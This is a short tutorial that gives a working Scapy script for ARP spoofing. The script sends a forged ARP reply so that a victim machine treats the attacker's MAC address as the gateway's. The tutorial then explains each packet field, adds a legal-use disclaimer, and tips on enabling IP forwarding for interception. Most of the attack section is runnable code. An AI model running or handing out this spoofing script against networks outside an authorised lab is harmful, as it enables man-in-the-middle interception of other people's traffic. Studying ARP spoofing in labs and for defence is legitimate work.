from scapy.all import ARP, send

# Create an ARP "response" packet (op=2) to simulate an ARP reply
fake_arp_response = ARP()

# Operation 2 means it's an ARP Reply
fake_arp_response.op = 2

# Target device's IP address (the victim who will receive the spoofed response)
fake_arp_response.pdst = "192.168.1.10"

# Target device's MAC address (the victim's MAC)
fake_arp_response.hwdst = "AA:BB:CC:DD:EE:FF"

# Spoofed sender MAC address (usually your attacker's MAC pretending to be gateway)
fake_arp_response.hwsrc = "11:22:33:44:55:66"

# Spoofed sender IP address (usually the gateway's IP)
fake_arp_response.psrc = "192.168.1.1"

# Show the contents of the crafted ARP packet
fake_arp_response.show()

# Send the fake ARP packet to the network (once)
send(fake_arp_response)

🧠 Explanation

    op=2: Specifies an ARP reply (not a request).

    pdst: The IP address of the machine you are pretending to respond to (the victim).

    hwdst: The MAC address of that machine.

    hwsrc: The fake MAC address you're claiming the sender has.

    psrc: The IP address you're spoofing (e.g., pretending to be the router).

🛡 Use Cases for Legal Testing

Use this only:

    In your own test lab using virtual machines.

    In Capture The Flag (CTF) competitions.

    In ethical hacking courses where the network is controlled.

    With a signed agreement in corporate penetration tests.

🧪 Want to Test in a Lab?

If you're using Kali Linux, you can set up a legal lab with:

    A Kali VM.

    A Windows or Linux victim VM on the same virtual LAN.

    Wireshark to monitor ARP traffic.

    echo 1 > /proc/sys/net/ipv4/ip_forward to forward packets if needed.
